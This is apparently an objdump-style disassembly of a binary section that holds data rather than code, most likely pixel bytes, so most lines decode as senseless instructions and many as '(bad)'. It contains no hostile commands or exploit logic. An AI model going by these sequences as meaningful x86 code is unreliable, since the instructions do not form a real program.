  412eb9:	pop    ss
  412eba:	pop    ss
  412ebb:	pop    eax
  412ebc:	add    BYTE PTR [eax],al
  412ebe:	add    BYTE PTR [edx],dh
  412ec0:	add    BYTE PTR [eax],al
  412ec2:	add    BYTE PTR [ebx],bh
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	add    BYTE PTR [ecx],dh
  412ec8:	add    BYTE PTR [eax],al
  412eca:	add    BYTE PTR [esi],ah
  412ecc:	add    BYTE PTR [eax],al
  412ece:	add    BYTE PTR [eax+eax*1],bl
  412ed1:	add    BYTE PTR [eax],al
  412ed3:	adc    al,BYTE PTR [eax]
  412ed5:	add    BYTE PTR [eax],al
  412ed7:	or     DWORD PTR [eax],eax
	...
  412f19:	add    BYTE PTR [eax],al
  412f1b:	add    BYTE PTR [edx-0x44524d4e],dh
  412f21:	mov    ebx,0xb9b9ffbb
  412f26:	mov    ecx,0xb9b9b9ff
  412f2b:	(bad)  
  412f2c:	mov    esi,0xc0ffbebe
  412f31:	rol    al,0xff
  412f34:	(bad)  
  412f35:	(bad)  
  412f36:	(bad)  
  412f37:	inc    edi
  412f39:	mov    edi,0xccccccff
  412f3f:	dec    esi
  412f41:	into   
  412f42:	into   
  412f43:	dec    esp
  412f45:	int3   
  412f46:	int3   
  412f47:	inc    edi
  412f49:	mov    edi,0xc3c3c3ff
  412f4f:	inc    eax
  412f51:	rol    al,0xff
  412f54:	mov    edx,0xb0ffbaba
  412f59:	mov    al,0xb0
  412f5b:	jmp    DWORD PTR [ebx-0x6b005c5d]
  412f61:	xchg   esp,eax
  412f62:	xchg   esp,eax
  412f63:	dec    DWORD PTR [esi-0x6e007172]
  412f69:	xchg   ecx,eax
  412f6a:	xchg   ecx,eax
  412f6b:	call   DWORD PTR [edi-0x50006869]
  412f71:	scas   eax,DWORD PTR es:[edi]
  412f72:	scas   eax,DWORD PTR es:[edi]
  412f73:	push   DWORD PTR [esp+esi*2+0x74]
  412f77:	ret    
  412f78:	add    BYTE PTR [eax],al
  412f7a:	add    BYTE PTR [edx],ah
  412f7c:	add    BYTE PTR [eax],al
  412f7e:	add    BYTE PTR [edx],ah
  412f80:	or     eax,0x300d0d
  412f85:	add    BYTE PTR [eax],al
  412f87:	sub    DWORD PTR [eax],eax
  412f89:	add    BYTE PTR [eax],al
  412f8b:	and    DWORD PTR [eax],eax
  412f8d:	add    BYTE PTR [eax],al
  412f8f:	sbb    BYTE PTR [eax],al
  412f91:	add    BYTE PTR [eax],al
  412f93:	sldt   WORD PTR [eax]
  412f96:	add    BYTE PTR [eax],cl
	...
  412fa0:	sub    ch,BYTE PTR [edx]
  412fa2:	sub    DWORD PTR [ecx],ebp
  412fa4:	outs   dx,DWORD PTR ds:[esi]
  412fa5:	ins    DWORD PTR es:[edi],dx
  412fa6:	outs   dx,DWORD PTR ds:[esi]
  412fa7:	loop   0x412f3c
  412fa9:	nop
  412faa:	xchg   ecx,eax
  412fab:	call   FWORD PTR [eax+0x59]
  412fae:	pop    ecx
  412faf:	lds    ecx,FWORD PTR ds:0x4a0e0e
  412fb5:	add    BYTE PTR [eax],al
  412fb7:	sbb    al,BYTE PTR [eax]
  412fb9:	add    BYTE PTR [eax],al
  412fbb:	and    eax,0x27000000
  412fc0:	add    BYTE PTR [eax],al
  412fc2:	add    BYTE PTR [eax],bh
  412fc4:	add    al,BYTE PTR [edx]
  412fc6:	add    DWORD PTR [edx],edi
  412fc8:	add    BYTE PTR [eax],al
  412fca:	add    BYTE PTR [eax],cl
	...
  412fdc:	mov    eax,0x9e18b8b8
  412fe1:	sahf   
  412fe2:	sahf   
  412fe3:	(bad)  
  412fe4:	retf   0xcaca
  412fe7:	inc    esp
  412fe9:	(bad)  
  412fea:	(bad)  
  412feb:	(bad)  
  412fec:	mov    eax,0xbaffb8b8
  412ff1:	mov    edx,0xbebeffba
  412ff6:	mov    esi,0xc0c0c0ff
  412ffb:	inc    ecx
  412ffd:	rol    ecx,0xff
  413000:	rol    ecx,0xc1
  413003:	inc    eax
  413005:	rol    al,0xff
  413008:	mov    eax,0xafffb8b8
  41300d:	scas   eax,DWORD PTR es:[edi]
  41300e:	scas   eax,DWORD PTR es:[edi]
  41300f:	jmp    DWORD PTR [ebx-0x67005c5d]
  413015:	cwde   
  413016:	cwde   
  413017:	inc    DWORD PTR [ebx+0x6dff8383]
  41301d:	ins    DWORD PTR es:[edi],dx
  41301e:	ins    DWORD PTR es:[edi],dx
  41301f:	jmp    FWORD PTR [ecx+0x69]
  413022:	imul   edi,edi,0xff81817f
  413028:	xchg   ebx,eax
  413029:	xchg   edx,eax
  41302a:	xchg   edx,eax
  41302b:	jmp    DWORD PTR [ebx-0x55005c5d]
  413031:	lods   al,BYTE PTR ds:[esi]
  413032:	lods   al,BYTE PTR ds:[esi]
  413033:	cld    
  413034:	pop    esp
  413035:	pop    esp
  413036:	pop    esp
  413037:	xchg   edx,eax
  413038:	dec    esi
  413039:	dec    esi
  41303a:	dec    edi
  41303b:	js     0x4130a7
  41303d:	push   0x6b
  41303f:	xchg   esi,eax
  413040:	add    DWORD PTR [ebx+0x2f2f8084],0x2f
  413047:	sub    DWORD PTR [eax],eax
  413049:	add    BYTE PTR [eax],al
  41304b:	push   ss
  41304c:	add    BYTE PTR [eax],al
  41304e:	add    BYTE PTR [ecx],dl
  413050:	add    BYTE PTR [eax],al
  413052:	add    BYTE PTR [ecx],cl
  413054:	add    BYTE PTR [eax],al
  413056:	add    BYTE PTR [eax+eax*1],al
  413059:	add    BYTE PTR [eax],al
  41305b:	add    BYTE PTR [ebp+0x64],ah
  41305e:	xor    ebx,DWORD PTR gs:[edi+0x5f]
  413062:	pop    esi
  413063:	jmp    0x413017
  413065:	mov    al,0xb0
  413067:	call   FWORD PTR [esi-0x1c006666]
  41306d:	loope  0x413050
  41306f:	(bad)  
  413070:	fcomp  st(0)
  413072:	fcos   
  413074:	inc    esi
  413075:	inc    esi
  413076:	inc    esi
  413077:	rol    DWORD PTR ds:0xe9a0505,cl
  41307d:	push   cs
  41307e:	push   cs
  41307f:	mov    ebx,0xff636363
  413084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413086:	mov    ds:0x4a4c4bff,eax
  41308b:	mov    ebp,0x55080b0a
  413090:	add    BYTE PTR [eax],al
  413092:	add    BYTE PTR [ecx],dl
	...
  4130a0:	pop    edx
  4130a1:	pop    edx
  4130a2:	pop    edx
  4130a3:	(bad)  
  4130a5:	push   eax
  4130a6:	push   eax
  4130a7:	and    BYTE PTR [esi-0x380d595a],0xc7
  4130ae:	(bad)  
  4130af:	(bad)  
  4130b0:	mov    ecx,0xadffb9b9
  4130b5:	lods   eax,DWORD PTR ds:[esi]
  4130b6:	lods   eax,DWORD PTR ds:[esi]
  4130b7:	jmp    DWORD PTR [ebp-0x5b005a5b]
  4130bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130bf:	jmp    DWORD PTR [esp+eiz*4-0x6868005c]
  4130c6:	xchg   edi,eax
  4130c7:	dec    DWORD PTR [ecx+0x7dff8989]
  4130cd:	jge    0x41314a
  4130cf:	push   DWORD PTR [ecx+0x71]
  4130d2:	jno    0x4130d3
  4130d4:	gs gs call FWORD PTR gs:[ebp+0x5e]
  4130da:	pop    esi
  4130db:	jmp    FWORD PTR [ecx+0x69]
  4130de:	push   0xffffffff
  4130e0:	add    BYTE PTR [edx-0x6565007d],0x9b
  4130e7:	jmp    FWORD PTR [ebp-0x49005155]
  4130ed:	mov    dh,0xb5
  4130ef:	(bad)  
  4130f0:	mov    ecx,0xb8f8b7b7
  4130f5:	mov    dh,0xb6
  4130f7:	out    dx,al
  4130f8:	(bad)  
  4130fa:	(bad)  
  4130fc:	fcmovnu st,st(3)
  4130fe:	(bad)  
  413100:	lahf   
  413101:	lahf   
  413102:	lahf   
  413103:	clc    
  413104:	jg     0x413185
  413106:	jle    0x413134
  413108:	add    BYTE PTR [eax],al
  41310a:	add    BYTE PTR [ebx],al
  41310c:	add    BYTE PTR [eax],al
  41310e:	add    BYTE PTR ds:0x3000000,al
  413114:	add    BYTE PTR [eax],al
  413116:	add    BYTE PTR [ecx],al
  413118:	add    BYTE PTR [eax],al
  41311a:	add    BYTE PTR [eax],al
  41311c:	cdq    
  41311d:	cwde   
  41311e:	fwait
  41311f:	mov    dh,BYTE PTR [eax-0x57005354]
  413125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413127:	call   DWORD PTR [esi-0x54006e6f]
  41312d:	stos   BYTE PTR es:[edi],al
  41312e:	stos   DWORD PTR es:[edi],eax
  41312f:	dec    edi
  413131:	iret   
  413132:	sar    bh,1
  413134:	ret    0xc2c2
  413137:	call   FWORD PTR [eax-0x74006768]
  41313d:	mov    ecx,DWORD PTR [ebx+0x5e5e5eff]
  413143:	loop   0x4131b2
  413145:	ins    DWORD PTR es:[edi],dx
  413146:	ins    DWORD PTR es:[edi],dx
  413147:	mov    bl,0xd1
  413149:	rcl    ecx,1
  41314b:	stc    
  41314c:	(bad)
  41314f:	call   DWORD PTR [ebp+0x55]
  413152:	push   esp
  413153:	leave  
  413154:	adc    dl,BYTE PTR [edx]
  413156:	adc    BYTE PTR [edi+0x0],bl
  413159:	add    BYTE PTR [eax],al
  41315b:	adc    eax,DWORD PTR [eax]
	...
  413165:	add    BYTE PTR [eax],al
  413167:	add    BYTE PTR [ebx+0x43],al
  41316a:	inc    ebx
  41316b:	cs dec esi
  41316d:	dec    esi
  41316e:	dec    ebp
  41316f:	cdq    
  413170:	lea    ecx,[ebp-0x5e5e1972]
  413176:	mov    eax,ds:0xa5a6a6ff
  41317b:	call   FWORD PTR [edi-0x7a006161]
  413181:	test   DWORD PTR [ebp+0x777878ff],eax
  413187:	(bad)  
  413188:	jp     0x413204
  41318a:	jns    0x41318b
  41318c:	jp     0x413209
  41318e:	jl     0x41318f
  413190:	jg     0x413211
  413192:	cmp    edi,0xff8a8988
  413198:	popf   
  413199:	popf   
  41319a:	lahf   
  41319b:	jmp    FWORD PTR [ebx-0x50005255]
  4131a1:	scas   al,BYTE PTR es:[edi]
  4131a2:	scas   al,BYTE PTR es:[edi]
  4131a3:	push   DWORD PTR [ecx-0x49004f51]
  4131a9:	mov    bh,0xb7
  4131ab:	push   DWORD PTR [ebx-0x46004b4c]
  4131b1:	ret    
  4131b2:	vshufps ymm2,ymm0,ymm3,0xd4
  4131b7:	inc    edx
  4131b9:	ret    
  4131ba:	(bad)  
  4131bd:	mov    esi,0xa7a7febe
  4131c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131c3:	push   DWORD PTR [eax+0x70]
  4131c6:	jo     0x413211
	...
  4131dc:	nop
  4131dd:	(bad)  
  4131de:	xchg   ecx,eax
  4131df:	sub    DWORD PTR [edx-0x50005859],0xffffffaa
  4131e6:	stos   BYTE PTR es:[edi],al
  4131e7:	call   FWORD PTR [edi-0x4d006364]
  4131ed:	mov    al,0xb2
  4131ef:	dec    eax
  4131f1:	enter  0xffcc,0xab
  4131f5:	lods   al,BYTE PTR ds:[esi]
  4131f6:	lods   al,BYTE PTR ds:[esi]
  4131f7:	jmp    FWORD PTR [ebp-0x47005354]
  4131fd:	mov    eax,0x8484ffb8
  413202:	test   cl,dh
  413204:	cs cs cs mov ch,0x19
  413209:	sbb    DWORD PTR [ecx],ebx
  41320b:	(bad)  
  41320c:	jno    0x413280
  41320e:	jae    0x4131c7
  413210:	rcl    dl,cl
  413212:	shl    ah,cl
  413214:	mov    bh,0xb7
  413216:	mov    bh,0xff
  413218:	push   esi
  413219:	push   esi
  41321a:	push   ebx
  41321b:	mov    esi,0x6b181818
  413220:	add    BYTE PTR [eax],al
  413222:	add    BYTE PTR [edi],ah
  413224:	add    BYTE PTR [eax],al
  413226:	add    BYTE PTR [esi],al
	...
  413230:	pop    ds
  413231:	and    BYTE PTR [eax],ah
  413233:	or     BYTE PTR [ecx],bh
  413235:	cmp    DWORD PTR [edx],edi
  413237:	xor    al,0x79
  413239:	jns    0x4132b6
  41323b:	(bad)  
  41323c:	xchg   esp,eax
  41323d:	xchg   ebp,eax
  41323e:	xchg   ebp,eax
  41323f:	cli    
  413240:	test   DWORD PTR [ebp-0x75740077],eax
  413246:	(bad)  
  413247:	dec    DWORD PTR [esi-0x6e006d72]
  41324d:	nop
  41324e:	xchg   ebp,eax
  41324f:	call   DWORD PTR [edi-0x5e006569]
  413255:	mov    eax,ds:0xaaaaffa4
  41325a:	lods   al,BYTE PTR ds:[esi]
  41325b:	jmp    FWORD PTR [eax-0x50004f53]
  413261:	mov    ecx,0xc8b7ffbc
  413266:	retf   
  413267:	dec    eax
  413269:	fcomp  st(3)
  41326b:	call   ecx
  41326d:	fsubrp st(1),st
  41326f:	(bad)  
  413270:	(bad)  
  413272:	(bad)  
  413273:	(bad)  
  413274:	(bad)  
  413276:	leave  
  413277:	dec    ebx
  413279:	retf   0xfec8
  41327c:	rol    ebp,0xc5
  41327f:	cld    
  413280:	stos   BYTE PTR es:[edi],al
  413281:	test   al,0xa8
  413283:	inc    DWORD PTR [esi+0x6d8686]
	...
  413299:	add    BYTE PTR [eax],al
  41329b:	add    BYTE PTR [ecx-0x517c6d70],dl
  4132a1:	stos   BYTE PTR es:[edi],al
  4132a2:	stos   DWORD PTR es:[edi],eax
  4132a3:	push   DWORD PTR [ebp-0x58004e50]
  4132a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ab:	push   DWORD PTR [esi-0x3f00494c]
  4132b1:	mov    edi,0xb8b8ffc0
  4132b6:	mov    eax,0xbababaff
  4132bb:	jmp    FWORD PTR [edi-0x32005051]
  4132c1:	int    0xcd
  4132c3:	(bad)  
  4132c4:	jmp    0xa9411cb2
  4132c9:	test   al,0xa8
  4132cb:	cli    
  4132cc:	cmp    DWORD PTR [eax],edi
  4132ce:	cmp    BYTE PTR [ebx-0x69e1e3e4],dh
  4132d4:	add    DWORD PTR [ebx-0x90a257c],0xfffffff5
  4132db:	jmp    DWORD PTR [ebx+0x19ffa2a2]
  4132e1:	pop    ss
  4132e2:	pop    ss
  4132e3:	test   DWORD PTR [edi],edx
  4132e5:	pop    ss
  4132e6:	sbb    BYTE PTR [esi],ah
  4132e8:	dec    eax
  4132e9:	dec    eax
  4132ea:	dec    edx
  4132eb:	inc    eax
  4132ec:	jae    0x413361
  4132ee:	ja     0x413364
  4132f0:	add    DWORD PTR [ecx-0x77775a7a],0xffffff8c
  4132f7:	int3   
  4132f8:	mov    cl,BYTE PTR [ecx-0x75751373]
  4132fe:	mov    ?,edi
  413300:	mov    WORD PTR [edx+edx*4-0x6b707401],cs
  413307:	dec    DWORD PTR [ebx-0x7300696f]
  41330d:	xchg   esi,eax
  41330e:	pushf  
  41330f:	call   FWORD PTR [edx-0x4e005258]
  413315:	mov    edi,0xd1c7ffc3
  41331a:	aam    0xff
  41331c:	rcl    ecx,1
  41331e:	sar    bh,cl
  413320:	rol    ecx,cl
  413322:	mov    esi,0xa4acdbff
  413327:	call   ebp
  413329:	jg     0x41339d
  41332b:	dec    edx
  41332d:	dec    eax
  41332e:	xor    al,0xff
  413330:	rcl    BYTE PTR ds:0x19b4ff06,0x13
  413337:	(bad)  
  413338:	mov    esp,0xc9ffa4a9
  41333d:	(bad)  
  41333f:	cld    
  413340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413343:	call   FWORD PTR [edi+0x8d9f9f]
	...
  413359:	add    BYTE PTR [eax],al
  41335b:	add    BYTE PTR [edx-0x497c6c70],dl
  413361:	mov    cl,0xb2
  413363:	(bad)  
  413364:	mov    ebp,0xb0ffb9b8
  413369:	stos   BYTE PTR es:[edi],al
  41336a:	lods   eax,DWORD PTR ds:[esi]
  41336b:	(bad)  
  41336c:	mov    esi,0xbbffbdbc
  413371:	mov    ebx,0x8e8effbb
  413376:	mov    ?,edi
  413378:	call   0xb5b5:0xb5ff9a9a
  41337f:	push   DWORD PTR [ebp-0x3f004a4b]
  413385:	rol    al,0xff
  413388:	jmp    0x413375
  41338a:	jmp    0x41338b
  41338c:	cmc    
  41338d:	cmc    
  41338e:	cmc    
  41338f:	call   DWORD PTR [eax+0x55f69090]
  413395:	push   ebp
  413396:	push   esi
  413397:	in     eax,dx
  413398:	pusha  
  413399:	popa   
  41339a:	(bad)  
  41339b:	hlt    
  41339c:	jno    0x41340e
  41339e:	jae    0x413375
  4133a0:	mov    DWORD PTR [edi-0x60602775],eax
  4133a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a7:	cmc    
  4133a8:	lahf   
  4133a9:	lahf   
  4133aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ab:	call   FWORD PTR [edx-0x6d005e63]
  4133b1:	xchg   edi,eax
  4133b2:	fwait
  4133b3:	call   DWORD PTR [eax-0x6e006269]
  4133b9:	popf   
  4133ba:	mov    eax,ds:0xaca796ff
  4133bf:	jmp    DWORD PTR [ebx-0x52004b50]
  4133c5:	scas   al,BYTE PTR es:[edi]
  4133c6:	scas   eax,DWORD PTR es:[edi]
  4133c7:	(bad)  
  4133c8:	mov    ecx,0xc6ffaba9
  4133cd:	mov    al,0xb0
  4133cf:	dec    eax
  4133d1:	mov    ds:0x87c8ff9e,eax
  4133d6:	jle    0x4133d7
  4133d8:	leave  
  4133d9:	bound  edx,QWORD PTR [ebx-0x1]
  4133dc:	mov    ebx,0xb4ff162a
  4133e1:	or     eax,DWORD PTR [eax]
  4133e3:	jmp    FWORD PTR [ebx-0x5b00fff8]
  4133e9:	or     DWORD PTR [eax],eax
  4133eb:	jmp    DWORD PTR [edx-0x5c00ffee]
  4133f1:	push   cs
  4133f2:	add    bh,bh
  4133f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133f5:	adc    al,0x1
  4133f7:	(bad)  
  4133f8:	mov    ebp,0xcdff9b9e
  4133fd:	fstp   st(7)
  4133ff:	(bad)  
  413400:	stos   BYTE PTR es:[edi],al
  413401:	test   eax,0x9999ffa9
  413406:	cdq    
  413407:	mov    cl,0x0
	...
  413419:	add    BYTE PTR [eax],al
  41341b:	add    BYTE PTR [ecx-0x417c6c6e],dl
  413421:	mov    bh,0xb7
  413423:	inc    ecx
  413425:	mov    edx,0xaaaeffbd
  41342a:	lods   al,BYTE PTR ds:[esi]
  41342b:	(bad)  
  41342c:	mov    esp,0xbcffbbba
  413431:	mov    esp,0x9f9fffbf
  413436:	lahf   
  413437:	call   FWORD PTR [eax-0x6f006768]
  41343d:	nop
  41343e:	nop
  41343f:	call   FWORD PTR [eax-0x6b006668]
  413445:	xchg   ebx,eax
  413446:	xchg   ebp,eax
  413447:	call   DWORD PTR [ecx-0x67006c6f]
  41344d:	call   0xff9b:0x9698ff9a
  413454:	pushf  
  413455:	fwait
  413456:	mov    eax,ds:0xaaa6a4ff
  41345b:	jmp    DWORD PTR [ecx+ebp*4-0x50590053]
  413462:	mov    dl,0xff
  413464:	test   al,0xb2
  413466:	mov    bh,0xff
  413468:	test   eax,0xaeffbcb6
  41346d:	mov    ebp,0xb8afffc2
  413472:	mov    edx,0xa8a7b3ff
  413477:	inc    ecx
  413479:	mov    ds:0x90c4ffa0,al
  41347e:	mov    ?,edi
  413480:	mov    ebx,0xb4ff6a6f
  413485:	inc    esi
  413486:	cmp    al,0xff
  413488:	test   eax,0xa1ff1625
  41348d:	or     al,BYTE PTR [eax]
  41348f:	jmp    DWORD PTR [ecx-0x5e00fffa]
  413495:	push   es
  413496:	add    bh,bh
  413498:	mov    ds:0xa6ff000e,al
  41349d:	sbb    ecx,DWORD PTR [edx]
  41349f:	jmp    FWORD PTR [eax-0x5300eddf]
  4134a5:	and    eax,0x28b1ff13
  4134aa:	adc    al,0xff
  4134ac:	mov    dl,0x29
  4134ae:	adc    eax,0x1024b3ff
  4134b3:	push   DWORD PTR [ebp-0x3e00f6e3]
  4134b9:	xchg   edi,eax
  4134ba:	xchg   ecx,eax
  4134bb:	dec    edi
  4134bd:	(bad)  
  4134bf:	(bad)  
  4134c0:	mov    cl,0xae
  4134c2:	scas   al,BYTE PTR es:[edi]
  4134c3:	call   FWORD PTR [edx+0xcc9b9b]
	...
  4134d9:	add    BYTE PTR [eax],al
  4134db:	add    BYTE PTR [ebx-0x3b7a6b6f],dl
  4134e1:	mov    esi,0xbec6ffbf
  4134e6:	sar    edi,0xb0
  4134e9:	lods   al,BYTE PTR ds:[esi]
  4134ea:	stos   DWORD PTR es:[edi],eax
  4134eb:	(bad)  
  4134ec:	mov    ebp,0xbbffbbba
  4134f1:	mov    ebx,0x9d9dffbc
  4134f6:	popf   
  4134f7:	call   FWORD PTR [ebp-0x62006263]
  4134fd:	popf   
  4134fe:	lahf   
  4134ff:	dec    DWORD PTR [esi-0x6d006d72]
  413505:	(bad)  
  413506:	xchg   ebp,eax
  413507:	dec    DWORD PTR [edx+0x7aff9392]
  41350d:	mov    ds:0x9f92ff91,eax
  413512:	mov    ds:0xb4afa2ff,eax
  413517:	push   DWORD PTR [ebx-0x3f00373d]
  41351d:	into   
  41351e:	iret   
  41351f:	inc    ecx
  413521:	ret    0xffc1
  413524:	mov    ecx,0xbaffa0a2
  413529:	xchg   DWORD PTR [eax+0x6b6db3ff],eax
  41352f:	jmp    DWORD PTR [edi-0x6100b5b4]
  413535:	sub    al,0x24
  413537:	call   FWORD PTR [eax-0x7400fff2]
  41353d:	add    BYTE PTR [eax],al
  41353f:	dec    DWORD PTR [ebx-0x70010000]
  413545:	add    BYTE PTR [eax],al
  413547:	call   DWORD PTR [ebx-0x6000fffb]
  41354d:	sbb    ecx,DWORD PTR [edx]
  41354f:	jmp    FWORD PTR [ebx-0x5100e3d5]
  413555:	sub    al,0x1c
  413557:	push   DWORD PTR [ecx-0x4c00e3d2]
  41355d:	xor    BYTE PTR [ebx],bl
  41355f:	push   DWORD PTR [ebp-0x4700e3d1]
  413565:	xor    BYTE PTR ds:0x1f31baff,bl
  41356b:	(bad)  
  41356c:	mov    esp,0xbdff1f33
  413571:	xor    bl,BYTE PTR [edi]
  413573:	(bad)  
  413574:	mov    ebp,0xc3ff0c22
  413579:	mov    BYTE PTR [edi-0x1],bh
  41357c:	into   
  41357d:	fsubrp st(1),st
  41357f:	push   DWORD PTR [ebp-0x65004b4b]
  413585:	cdq    
  413586:	cdq    
  413587:	fld    QWORD PTR [eax]
	...
  413599:	add    BYTE PTR [eax],al
  41359b:	add    BYTE PTR [ecx-0x35796a6e],dl
  4135a1:	ret    
  4135a2:	ret    
  4135a3:	dec    edx
  4135a5:	(bad)  
  4135a6:	(bad)  
  4135a7:	push   DWORD PTR [ecx-0x42005354]
  4135ad:	mov    edx,0xbbbbffbb
  4135b2:	mov    esp,0x9d9d9dff
  4135b7:	call   FWORD PTR [edi-0x4d006061]
  4135bd:	mov    dl,0xb3
  4135bf:	call   DWORD PTR [esi-0x6a006569]
  4135c5:	cdq    
  4135c6:	popf   
  4135c7:	jmp    FWORD PTR [ebp+edi*4-0x3c4b0043]
  4135ce:	mov    edi,0xacabb5ff
  4135d3:	jmp    FWORD PTR [ebp-0x57007c7a]
  4135d9:	pusha  
  4135da:	pop    ebp
  4135db:	jmp    DWORD PTR [edx-0x6900bab9]
  4135e1:	sub    eax,0x138dff2c
  4135e6:	push   cs
  4135e7:	inc    DWORD PTR [eax+eax*1+0x7aff00]
  4135ee:	add    bh,bh
  4135f0:	jl     0x4135f2
  4135f2:	add    bh,bh
  4135f4:	test   DWORD PTR [eax],eax
  4135f6:	add    bh,bh
  4135f8:	mov    al,BYTE PTR ds:0xf92ff00
  4135fe:	add    bh,bh
  413600:	xchg   edi,eax
  413601:	adc    BYTE PTR [eax],al
  413603:	call   FWORD PTR [ecx+edx*1+0x12a2ff00]
  41360a:	add    bh,bh
  41360c:	scas   al,BYTE PTR es:[edi]
  41360d:	sub    BYTE PTR [esi],dl
  41360f:	push   DWORD PTR [esi-0x4900d9c9]
  413615:	ss and eax,0x2638b8ff
  41361b:	(bad)  
  41361c:	mov    ebx,0xbfff2737
  413621:	cmp    esp,DWORD PTR [edi]
  413623:	inc    edx
  413625:	cmp    al,0x29
  413627:	inc    esp
  413629:	ds sub bh,bh
  41362c:	(bad)  
  41362d:	aas    
  41362e:	sub    edi,edi
  413630:	mov    DWORD PTR [edx+0x2c],0x142ec7ff
  413637:	inc    edi
  413639:	js     0x4136a8
  41363b:	dec    edi
  41363d:	fstp   st(7)
  41363f:	(bad)  
  413640:	mov    ecx,0x9affbbbb
  413645:	cdq    
  413646:	cdq    
  413647:	jmp    0x0:0x0
	...
  41365a:	add    BYTE PTR [eax],al
  41365c:	xchg   edx,eax
  41365d:	xchg   ecx,eax
  41365e:	xchg   ebp,eax
  41365f:	xchg   ah,cl
  413661:	mov    edi,0xc6c6ccff
  413667:	push   DWORD PTR [ebx-0x44005152]
  41366d:	mov    ebx,0xbcbcffbd
  413672:	mov    ebp,0xa1a0a0ff
  413677:	jmp    DWORD PTR [ecx-0x4c005e5f]
  41367d:	mov    bl,0xb3
  41367f:	jmp    DWORD PTR [eax+ebp*4-0x705d0054]
  413686:	mov    ?,edi
  413688:	xchg   esi,eax
  413689:	cmp    DWORD PTR [eax],edi
  41368b:	call   DWORD PTR [esi-0x7100d7db]
  413691:	sbb    dl,BYTE PTR [edi+edi*8]
  413694:	mov    BYTE PTR [ebx],cl
  413696:	add    bh,bh
  413698:	add    BYTE PTR [eax],0x0
  41369b:	(bad)  
  41369c:	jl     0x41369e
  41369e:	add    bh,bh
  4136a0:	jge    0x4136a2
  4136a2:	add    bh,bh
  4136a4:	jg     0x4136a6
  4136a6:	add    bh,bh
  4136a8:	add    DWORD PTR [edi],0xd87ff00
  4136ae:	add    bh,bh
  4136b0:	mov    cs,WORD PTR [edi]
  4136b2:	add    bh,bh
  4136b4:	nop
  4136b5:	(bad)  
  4136b7:	call   DWORD PTR [ebx+0x7eff010f]
  4136bd:	and    bl,BYTE PTR [eax]
  4136bf:	(bad)  
  4136c0:	jp     0x4136da
  4136c2:	or     eax,0x119fff
  4136c7:	jmp    FWORD PTR [eax-0x4b00feec]
  4136cd:	xor    DWORD PTR [edi],ebx
  4136cf:	(bad)  
  4136d0:	mov    esp,0xbfff3242
  4136d5:	inc    edx
  4136d6:	xor    edi,edi
  4136d8:	ret    
  4136d9:	inc    esp
  4136da:	xor    edi,edi
  4136dc:	mov    BYTE PTR [esi+0x32],0xff
  4136e0:	enter  0x3448,0xff
  4136e4:	retf   
  4136e5:	dec    ecx
  4136e6:	xor    eax,0x364bcdff
  4136eb:	dec    edi
  4136ed:	dec    esp
  4136ee:	aaa    
  4136ef:	call   eax
  4136f1:	dec    edi
  4136f2:	cmp    bh,bh
  4136f4:	sar    DWORD PTR [ebx],1
  4136f6:	and    bh,bh
  4136f8:	retf   0x5e6c
  4136fb:	dec    ebp
  4136fd:	xlat   BYTE PTR ds:[ebx]
  4136fe:	fdivr  st,st(7)
  413700:	(bad)  
  413701:	enter  0xffc8,0x9b
  413705:	call   0x0:0xf09a
	...
  41371c:	xchg   ebx,eax
  41371d:	nop
  41371e:	xchg   esp,eax
  41371f:	xchg   al,dl
  413721:	leave  
  413722:	enter  0xcfff,0xc9
  413726:	retf   0xb3ff
  413729:	mov    al,0xb1
  41372b:	(bad)  
  41372c:	mov    ebx,0xbfffbbb9
  413731:	mov    edi,0xa6a6ffbf
  413736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413737:	jmp    DWORD PTR [ebp-0x50005a5b]
  41373d:	scas   eax,DWORD PTR es:[edi]
  41373e:	scas   eax,DWORD PTR es:[edi]
  41373f:	push   DWORD PTR [edx-0x62004448]
  413745:	mov    DWORD PTR [edx+0x7cff],ecx
  41374b:	inc    DWORD PTR [edx-0x7600ffff]
  413751:	push   cs
  413752:	push   es
  413753:	dec    DWORD PTR [ecx-0x7700f8ef]
  413759:	adc    cl,BYTE PTR [eax]
  41375b:	inc    DWORD PTR [edi-0x7900f8ef]
  413761:	(bad)  
  413763:	inc    DWORD PTR [ebp-0x7800fef5]
  413769:	or     al,0x0
  41376b:	dec    DWORD PTR [ebp-0x6d00fff3]
  413771:	push   cs
  413772:	add    bh,bh
  413774:	xchg   esp,eax
  413775:	(bad)  
  413777:	(bad)  
  413778:	jg     0x4137aa
  41377a:	daa    
  41377b:	jmp    FWORD PTR [eax-0x5b00595a]
  413781:	mov    al,ds:0x1983ff9f
  413786:	or     eax,0x518acff
  41378b:	(bad)  
  41378c:	mov    edi,0xc6ff3041
  413791:	push   edx
  413792:	inc    ecx
  413793:	dec    ecx
  413795:	push   ecx
  413796:	inc    eax
  413797:	dec    ebp
  413799:	push   ebx
  41379a:	aas    
  41379b:	call   eax
  41379d:	push   ebp
  41379e:	inc    eax
  41379f:	call   edx
  4137a1:	push   edi
  4137a2:	inc    ebx
  4137a3:	call   esp
  4137a5:	pop    eax
  4137a6:	inc    esp
  4137a7:	call   esi
  4137a9:	pop    edx
  4137aa:	inc    ebp
  4137ab:	(bad)  
  4137ac:	fcomp  DWORD PTR [ebx+0x46]
  4137af:	(bad)  
  4137b0:	fstp   DWORD PTR [esi+0x49]
  4137b3:	(bad)  
  4137b4:	fmul   QWORD PTR [esi+0x35]
  4137b7:	call   ebx
  4137b9:	arpl   WORD PTR [eax-0x1],dx
